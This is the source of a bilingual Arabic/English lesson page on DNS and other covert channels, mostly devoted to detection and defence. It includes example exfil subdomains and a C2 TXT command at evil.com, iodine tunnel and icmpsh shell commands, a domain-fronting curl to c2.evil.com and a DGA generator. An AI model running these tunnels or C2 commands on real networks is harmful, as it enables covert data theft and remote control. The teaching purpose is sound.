"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="dns-covert-channels">
      <L
        ar={<>
          <Section title="ليه القنوات السرية بتخيف الـ Blue Team؟">
            <p>سؤال بسيط: إيه البروتوكول اللي مفيش firewall في الدنيا يقدر يقفله؟</p>
            <p>HTTPS؟ ممكن — مع TLS inspection.</p>
            <p>SMTP؟ ممكن، عند الـ gateway.</p>
            <p>DNS؟</p>
            <p>لأ. لو قفلت DNS، الإنترنت بظابطه وقع عند الموظفين. مفيش resolution، مفيش office.com، مفيش teams، مفيش حاجة. والأخطر: مفيش أي مدير IT شجاع كفاية يقفله &quot;ليوم واحد&quot; عشان debug. ده بقا قانون كوني.</p>
            <p>والـ APTs عارفة ده.</p>
            <Analogy>زي تهريب رسالة في رحلة ركّاب عادية. ماحدش بيفتّش كل المسافرين. بس الحرف الأول من كل اسم في قائمة الركاب بيهجّى رسالة كاملة. الـ traffic شرعي 100%. الرسالة سرية 100%. والحارس واقف عمال يبص في وشهم وما يتفرّجش على القائمة.</Analogy>
            <Callout kind="danger" title="بُص قبل ما تكمل">
              تشغيل DNS tunnel على شبكة مش بتاعتك = جناية. الدرس ده للـ lab الخاص، أو في نطاق pentest مكتوب وموقّع. مفيش &quot;بس عشان أجرب&quot;.
            </Callout>
            <Callout kind="warn" title="غلطات الـ junior">
              <ul>
                <li>بيفكّر إن &quot;DNS مش مهم&quot; ومش بيلوّجه أصلاً، فلما الكارثة تيجي يكتشف إن مفيش عنده visibility.</li>
                <li>بيشغّل iodine على tunnel وبيفكّر إنه &quot;متخفّي&quot; — والـ subdomain طوله 60 حرف عشوائي. أي SOC شاطر بيلاقيه في 5 دقايق.</li>
                <li>بيعمل DGA scoring على scoring واحد بس (entropy)، فالمهاجم اللي بيستخدم dictionary words بيعدّي.</li>
                <li>بيعتمد على blocklist للدومينات. الـ DGA بيغيّر كل يوم. الـ blocklist لسه من السنة اللي فاتت.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="قصة من الواقع — DNSpionage و OilRig">
            <p>2018-2019. مجموعة OilRig (إيرانية مدعومة) شغّلت حملة DNSpionage ضد جهات حكومية في لبنان والإمارات. الـ malware اسمه DNSpionage بيتواصل مع C2 عبر DNS بس. كل أمر بييجي في TXT record. كل بيانات المسروقة بتطلع في subdomain.</p>
            <p>قدّ إيه قعدوا جوه قبل ما حد ياخد باله؟</p>
            <p>أشهر. كل firewall كان شايف DNS عادي. كل proxy كان شايف الـ HTTPS بتاع البريد بيشتغل. ماحدش كان بيبص في DNS query strings.</p>
            <p>الـ Blue Team لما اكتشفوا، اتضح إن الـ traffic كان بـ MB كل يوم بيخرج من DNS. ولا واحد لاحظ. الـ visibility كانت مفيش.</p>
            <p>OPM hack في 2015 (الصينيين سرقوا بيانات 22 مليون موظف فيدرالي) — جزء كبير من الـ exfil كان عبر DNS برضه. سنة كاملة قبل ما يحسّوا.</p>
            <p>الـ DNS هو السكة المفضّلة للـ APT لأنها ببساطة بتشتغل.</p>
          </Section>

          <Section title="DNS — السيرفر السحري للمهاجم">
            <ul>
              <li><b>مسموح دايماً.</b> أي جهاز محتاجه. تقفله = تكسر الإنترنت.</li>
              <li><b>Recursive عبر resolver داخلي.</b> حتى لو قفلت الخروج المباشر، الـ resolver بيعمل الشغل بالنيابة عنك.</li>
              <li><b>ضوضاء طبيعي عالي.</b> الضوضاء الحقيقية بتخبّي الضوضاء الخبيثة.</li>
              <li><b>الـ logs نادراً ما حد بيغوص فيها.</b> أغلب الـ Blue Teams بتجمع NetFlow و proxy logs، بس DNS queries محدش بيبص جواها.</li>
            </ul>
          </Section>

          <Section title="ميكانيكا DNS Tunneling">
            <p>المهاجم عنده authoritative DNS لـ <span className="eng">evil.com</span>. الجهاز المخترق بيبعت الداتا في <b>الـ subdomain</b>:</p>
            <Code lang="text">{`# Exfil — البيانات → subdomain encoded
ZGF0YS10by1leGZpbA.evil.com
[base32-data].evil.com

# Beacon C2 — أوامر تأتي في TXT/CNAME response
$ dig TXT cmd.evil.com
;; ANSWER SECTION:
cmd.evil.com.  60  IN  TXT  "exec:whoami"`}</Code>

            <p>الـ resolver الداخلي يحوّل الاستعلام إلى <span className="eng">ns.evil.com</span> (الذي يسيطر عليه المهاجم). البيانات تصل عبر هذا الجسر.</p>

            <Terminal lines={[
              { p: "# مثال عملي بـ iodine (الأقدم و الأشهر)" },
              { p: "# على الخادم (المهاجم):" },
              { p: "iodined -f -c -P p4ssw0rd 10.0.0.1 t.evil.com" },
              { p: "" },
              { p: "# على العميل (المخترَق):" },
              { p: "iodine -f -P p4ssw0rd t.evil.com" },
              { p: "# الآن لديك tunnel كامل عبر DNS فقط — IP routing فوقه" },
            ]} />
          </Section>

          <Section title="أدوات شائعة">
            <TwoCol>
              <Card title="iodine" color="red">
                IP-over-DNS كامل. سرعة معقولة (~100KB/s). كشف سهل من حجم الـ subdomains.
              </Card>
              <Card title="dnscat2" color="red">
                C2 channel فقط (لا full IP). إخفاء أفضل، أبطأ. يُستخدم بكثرة في pentests.
              </Card>
              <Card title="Cobalt Strike DNS Beacon" color="red">
                C2 احترافي. تحكّم بـ A/AAAA/TXT records و معدلات الـ beacon.
              </Card>
              <Card title="DNScat-powershell" color="red">
                تنفيذ بدون binaries — كل شيء PowerShell. مناسب لـ environments محظور فيها downloads.
              </Card>
              <Card title="OOB via DNS (sslip.io / interactsh)" color="amber">
                استخراج بيانات من SSRF / blind XSS — نسخة بسيطة، packet واحد لكل قطعة.
              </Card>
              <Card title="Sliver DNS C2" color="red">
                C2 framework حديث مفتوح المصدر، DNS من ضمن transports مدعومة.
              </Card>
            </TwoCol>
          </Section>

          <Section title="HTTPS / HTTP/3 — قناة الجيل الجديد">
            <p>DNS tunneling قديم. الموجة الحالية: <b>Domain Fronting</b> + <b>HTTPS C2</b> فوق CDN معروف (CloudFront, Fastly).</p>
            <Code lang="text">{`# Domain Fronting (بات أصعب لكن لا يزال يحدث على بعض CDNs)
# SNI:   cdn.legitimate-site.com    ← ما يراه firewall
# Host:  c2.evil.com                ← ما يصل للـ origin

curl --resolve cdn.legitimate-site.com:443:1.2.3.4 \\
  -H "Host: c2.evil.com" \\
  https://cdn.legitimate-site.com/`}</Code>
            <ul>
              <li>الـ TLS مشفّر → يخفي Host header عن middleware عادي.</li>
              <li>HTTP/3 (QUIC) فوق UDP/443 — كثير من الـ middleboxes لا تفكّه.</li>
              <li>Encrypted Client Hello (ECH) — يخفي حتى SNI. الموجة القادمة من القنوات السرية.</li>
            </ul>
          </Section>

          <Section title="ICMP و بروتوكولات أخرى">
            <Code lang="bash">{`# ICMP tunneling — البيانات في data field من ping
# server
icmpsh-m.py 0.0.0.0

# client (Windows victim)
icmpsh.exe -t 1.2.3.4 -d 500 -b 30 -s 128

# WebSocket — داخل WSS صعب التمييز عن traffic عادي
# SMTP/IMAP — exfil في email drafts (kept on server, never sent)
# NTP — حقول options نادراً ما تُفحص`}</Code>
          </Section>

          <Section title="DGAs — Domain Generation Algorithms">
            <p>بدلاً من C2 ثابت يسهل حظره، malware يولّد <b>آلاف</b> أسماء نطاقات يومياً. واحد منها فقط مُسجّل من المهاجم. مثال (Conficker):</p>
            <Code lang="python">{`import datetime
import hashlib

def conficker_domains(date, count=250):
    seed = date.strftime("%Y-%m-%d").encode()
    domains = []
    for i in range(count):
        h = hashlib.md5(seed + i.to_bytes(2, 'big')).hexdigest()[:8]
        tld = ['.com','.net','.org','.info','.biz'][i % 5]
        domains.append(h + tld)
    return domains

print(conficker_domains(datetime.date(2026, 4, 30))[:5])
# ['a1b2c3d4.com', '5e6f7g8h.net', ...]`}</Code>
            <p><b>Fast Flux</b>: نفس النطاق يتغيّر IP الخاص به كل بضع دقائق (TTL منخفض، آلاف bots كـ proxy).</p>
          </Section>

          <Section title="الكشف — كيف يصطاد الـ Blue Team هذه">
            <Callout kind="good" title="مؤشّرات DNS tunneling">
              <ul>
                <li><b>Subdomain length</b> — أكثر من 50 حرفاً نادر جداً في DNS طبيعي.</li>
                <li><b>Entropy</b> — أسماء عشوائية (e.g. <span className="eng">af83hd92lqx</span>) لها entropy عالية. حسابها سهل (Shannon).</li>
                <li><b>Query rate</b> — جهاز يستعلم 5000 query لنفس النطاق في ساعة = شاذ.</li>
                <li><b>Unique subdomains</b> — &gt;100 unique subs لـ one parent domain من client واحد = إنذار.</li>
                <li><b>NXDOMAIN ratio</b> — DGAs تنتج NXDOMAINs كثيرة (نطاقات لم تُسجّل بعد).</li>
                <li><b>TXT/NULL records مفرطة</b> — مستخدمة لـ exfil كميات أكبر.</li>
              </ul>
            </Callout>
            <Code lang="kql">{`// Microsoft Sentinel — كشف entropy عالي في subdomains
DnsEvents
| where TimeGenerated > ago(1h) and SubType == "LookupQuery"
| extend Subdomain = extract(@"^([^.]+)\\.", 1, Name)
| extend Length = strlen(Subdomain)
| where Length > 30
| extend Entropy = todouble(strlen(replace_regex(Subdomain, @"[^a-z0-9]", ""))) / Length
| summarize Queries=count(), AvgLen=avg(Length) by ClientIP, Domain=extract(@"\\.([^.]+\\.[^.]+)$", 1, Name)
| where Queries > 50 and AvgLen > 30
| order by Queries desc`}</Code>
            <Code lang="bash">{`# Zeek — قواعد دفاعية حول DNS
# zeek-cut من dns.log
cat dns.log.gz | zcat | zeek-cut id.orig_h query | \\
  awk '{print $1, length($2)}' | \\
  awk '$2 > 50 {count[$1]++} END {for (i in count) if (count[i] > 100) print i, count[i]}'`}</Code>
          </Section>

          <Section title="الحماية — بناء المظلة">
            <ol>
              <li><b>DNS مركزي.</b> لا تسمح للـ endpoints بـ DNS مباشر. كل شيء عبر resolver داخلي يسجّل بالكامل.</li>
              <li><b>DNS Firewall (RPZ)</b> — حظر nationally bad TLDs و categories معروفة سيئة.</li>
              <li><b>Threat Intelligence feeds</b> — قائمة DGA domains (DGArchive, dnsdb) → block.</li>
              <li><b>Egress filtering</b> — منع DoH/DoT المباشر (UDP/853, well-known DoH endpoints) إلا للـ resolver.</li>
              <li><b>TLS Inspection</b> حيث ممكن قانونياً — يفكّ Domain Fronting.</li>
              <li><b>Beaconing detection</b> — RITA, Zeek + Spicy تكشف الـ jitter المنتظم.</li>
              <li><b>Anomaly ML</b> — Cloudflare/Akamai/Microsoft Defender for DNS يحوي نماذج جاهزة لـ DGA و tunneling.</li>
            </ol>
            <Callout kind="info" title="MITRE ATT&CK">
              T1071.004 (Application Layer Protocol: DNS) · T1572 (Protocol Tunneling) · T1568.002 (DGA) · T1132 (Data Encoding) · T1041 (Exfiltration over C2 Channel).
            </Callout>
          </Section>

          <Section title="ميدان التدريب — ما تحتاج لتجرّب">
            <ul>
              <li><b>Lab</b>: domain خاصة بك ($10/سنة)، VPS بسيط، ضحية افتراضية.</li>
              <li><b>أدوات</b>: iodine, dnscat2, Sliver، interactsh للـ OOB البسيط.</li>
              <li><b>تحليل</b>: Wireshark + Zeek + RITA على الـ pcap.</li>
              <li><b>قياس</b>: قارن DNS query rate قبل و أثناء الـ tunnel — هذا يعلّم Blue Team.</li>
            </ul>
            <Callout kind="good" title="الخلاصة الناشفة">
              <p>مفيش دفاع واحد بيقفل القنوات السرية.</p>
              <p>الفلسفة الصحيحة: <b>visibility كاملة على كل egress</b>، baseline لكل host، تنبيه على أي انحراف.</p>
              <p>لو ما عندكش DNS logging مركزي، أنت أعمى. مش &quot;عندك ثغرة&quot; — أعمى.</p>
              <p>لو DNS بيخرج من endpoints مباشرة لـ 8.8.8.8، أنت بتبيع الـ visibility بإيدك.</p>
              <p>الـ DNS tunnel بيبقى ضوضاء فوق ضوضاء. والضوضاء فوق الضوضاء بتبان — بس بس لو في حد بيسمع.</p>
            </Callout>
          </Section>
        </>}
        en={<>
          <Section title="Why covert channels frighten the Blue Team">
            <p>Firewalls inspect protocol and destination. EDR inspects processes. But a covert channel <b>hides inside an allowed protocol</b> — DNS, HTTPS, ICMP — and ferries data with every "normal" packet. Result: gigabytes can flow past the guard without anything looking wrong.</p>
            <Analogy>Like smuggling a message inside a regular passenger flight: no one frisks every traveler, but the first letter of each row's name on the boarding list spells a complete sentence. Traffic is 100% legitimate — yet the data is fully covert.</Analogy>
            <Callout kind="danger" title="Legal warning">
              Running a DNS tunnel on a network you don't own is a crime. This lesson is for personal labs, or pentests with written scope.
            </Callout>
          </Section>

          <Section title="DNS — why a magical server for the attacker">
            <ul>
              <li><b>Always allowed.</b> Every device needs it. Blocking breaks the internet.</li>
              <li><b>Recursive via internal resolver.</b> Even if outbound is blocked, the resolver does it for you.</li>
              <li><b>Very noisy.</b> Real noise hides malicious noise.</li>
              <li><b>Logs rarely deeply analyzed.</b> Most blue teams collect NetFlow and proxy logs but don't peek into DNS query strings.</li>
            </ul>
          </Section>

          <Section title="DNS tunneling mechanics">
            <p>The attacker owns authoritative DNS for <span className="eng">evil.com</span>. The compromised host puts data in a <b>subdomain label</b>:</p>
            <Code lang="text">{`# Exfil — data → encoded subdomain
ZGF0YS10by1leGZpbA.evil.com
[base32-data].evil.com

# Beacon C2 — commands come back in TXT/CNAME
$ dig TXT cmd.evil.com
;; ANSWER SECTION:
cmd.evil.com.  60  IN  TXT  "exec:whoami"`}</Code>

            <p>The internal resolver forwards the lookup to <span className="eng">ns.evil.com</span> (attacker-controlled). Data crosses that bridge.</p>

            <Terminal lines={[
              { p: "# Hands-on with iodine (oldest and most famous)" },
              { p: "# On the server (attacker):" },
              { p: "iodined -f -c -P p4ssw0rd 10.0.0.1 t.evil.com" },
              { p: "" },
              { p: "# On the client (victim):" },
              { p: "iodine -f -P p4ssw0rd t.evil.com" },
              { p: "# Now you have a full tunnel over DNS only — IP routes on top" },
            ]} />
          </Section>

          <Section title="Common tooling">
            <TwoCol>
              <Card title="iodine" color="red">
                Full IP-over-DNS. Decent throughput (~100KB/s). Easy to detect from subdomain shape.
              </Card>
              <Card title="dnscat2" color="red">
                C2 channel only (no full IP). Stealthier, slower. Heavily used in pentests.
              </Card>
              <Card title="Cobalt Strike DNS Beacon" color="red">
                Pro C2. Tune A/AAAA/TXT mix and beacon cadence.
              </Card>
              <Card title="DNScat-powershell" color="red">
                Binary-less — pure PowerShell. Useful where downloads are blocked.
              </Card>
              <Card title="OOB via DNS (sslip.io / interactsh)" color="amber">
                Out-of-band exfil from SSRF / blind XSS — light variant, one packet per chunk.
              </Card>
              <Card title="Sliver DNS C2" color="red">
                Modern open-source C2; DNS is a supported transport.
              </Card>
            </TwoCol>
          </Section>

          <Section title="HTTPS / HTTP/3 — the next-gen channel">
            <p>DNS tunneling is old. The current wave: <b>domain fronting</b> + <b>HTTPS C2</b> behind a major CDN (CloudFront, Fastly).</p>
            <Code lang="text">{`# Domain fronting (harder now, but still alive on some CDNs)
# SNI:   cdn.legitimate-site.com    ← what the firewall sees
# Host:  c2.evil.com                ← what reaches the origin

curl --resolve cdn.legitimate-site.com:443:1.2.3.4 \\
  -H "Host: c2.evil.com" \\
  https://cdn.legitimate-site.com/`}</Code>
            <ul>
              <li>TLS encrypted → hides the Host header from naive middleware.</li>
              <li>HTTP/3 (QUIC) over UDP/443 — many middleboxes can't parse it.</li>
              <li>Encrypted Client Hello (ECH) — even SNI hidden. Next wave of covert channels.</li>
            </ul>
          </Section>

          <Section title="ICMP and other protocols">
            <Code lang="bash">{`# ICMP tunneling — payload in ping data field
# server
icmpsh-m.py 0.0.0.0

# client (Windows victim)
icmpsh.exe -t 1.2.3.4 -d 500 -b 30 -s 128

# WebSocket — inside WSS, hard to tell from normal app traffic
# SMTP/IMAP — exfil in email drafts (kept on server, never sent)
# NTP — option fields rarely inspected`}</Code>
          </Section>

          <Section title="DGAs — Domain Generation Algorithms">
            <p>Instead of a fixed C2 that's easy to block, malware generates <b>thousands</b> of domains per day. Only one is registered by the attacker. Conficker-style example:</p>
            <Code lang="python">{`import datetime
import hashlib

def conficker_domains(date, count=250):
    seed = date.strftime("%Y-%m-%d").encode()
    domains = []
    for i in range(count):
        h = hashlib.md5(seed + i.to_bytes(2, 'big')).hexdigest()[:8]
        tld = ['.com','.net','.org','.info','.biz'][i % 5]
        domains.append(h + tld)
    return domains

print(conficker_domains(datetime.date(2026, 4, 30))[:5])
# ['a1b2c3d4.com', '5e6f7g8h.net', ...]`}</Code>
            <p><b>Fast Flux</b>: same domain rotates IPs every few minutes (low TTL, thousands of bots as reverse proxies).</p>
          </Section>

          <Section title="Detection — how Blue Team hunts these">
            <Callout kind="good" title="DNS tunneling indicators">
              <ul>
                <li><b>Subdomain length</b> — &gt; 50 chars is rare in normal DNS.</li>
                <li><b>Entropy</b> — random-looking labels (e.g. <span className="eng">af83hd92lqx</span>) score high. Trivial to compute (Shannon).</li>
                <li><b>Query rate</b> — one host firing 5000 queries to one zone per hour = anomalous.</li>
                <li><b>Unique subdomains</b> — &gt; 100 unique subs to one parent from one client = alert.</li>
                <li><b>NXDOMAIN ratio</b> — DGAs throw lots of NXDOMAINs (most aren't registered).</li>
                <li><b>Excess TXT/NULL records</b> — used for higher-volume exfil.</li>
              </ul>
            </Callout>
            <Code lang="kql">{`// Microsoft Sentinel — high-entropy subdomain detection
DnsEvents
| where TimeGenerated > ago(1h) and SubType == "LookupQuery"
| extend Subdomain = extract(@"^([^.]+)\\.", 1, Name)
| extend Length = strlen(Subdomain)
| where Length > 30
| extend Entropy = todouble(strlen(replace_regex(Subdomain, @"[^a-z0-9]", ""))) / Length
| summarize Queries=count(), AvgLen=avg(Length) by ClientIP, Domain=extract(@"\\.([^.]+\\.[^.]+)$", 1, Name)
| where Queries > 50 and AvgLen > 30
| order by Queries desc`}</Code>
            <Code lang="bash">{`# Zeek — defensive rules over DNS
# zeek-cut from dns.log
cat dns.log.gz | zcat | zeek-cut id.orig_h query | \\
  awk '{print $1, length($2)}' | \\
  awk '$2 > 50 {count[$1]++} END {for (i in count) if (count[i] > 100) print i, count[i]}'`}</Code>
          </Section>

          <Section title="Defense — building the umbrella">
            <ol>
              <li><b>Centralize DNS.</b> No direct DNS from endpoints. Everything through an internal resolver that fully logs.</li>
              <li><b>DNS Firewall (RPZ)</b> — block nationally bad TLDs and known-bad categories.</li>
              <li><b>Threat-intel feeds</b> — DGA domain lists (DGArchive, dnsdb) → block.</li>
              <li><b>Egress filtering</b> — block direct DoH/DoT (UDP/853, well-known DoH endpoints) except your resolver.</li>
              <li><b>TLS inspection</b> where legally permitted — defeats domain fronting.</li>
              <li><b>Beaconing detection</b> — RITA, Zeek + Spicy spot regular jitter patterns.</li>
              <li><b>Anomaly ML</b> — Cloudflare/Akamai/Microsoft Defender for DNS ship pre-trained DGA + tunneling models.</li>
            </ol>
            <Callout kind="info" title="MITRE ATT&CK">
              T1071.004 (Application Layer Protocol: DNS) · T1572 (Protocol Tunneling) · T1568.002 (DGA) · T1132 (Data Encoding) · T1041 (Exfiltration over C2 Channel).
            </Callout>
          </Section>

          <Section title="Lab — what you need to try">
            <ul>
              <li><b>Lab</b>: a domain you own ($10/yr), a small VPS, a victim VM.</li>
              <li><b>Tools</b>: iodine, dnscat2, Sliver, interactsh for the lightweight OOB case.</li>
              <li><b>Analysis</b>: Wireshark + Zeek + RITA over the pcap.</li>
              <li><b>Measurement</b>: compare DNS query rate before/during the tunnel — this is what trains the Blue Team's eye.</li>
            </ul>
            <Callout kind="good" title="Bottom line">
              No single defense beats covert channels. The right philosophy: <b>full visibility on every egress</b>, per-host baselines, alert on deviations. At that level, a DNS tunnel becomes noise on top of noise — and noise on noise is what shows up.
            </Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
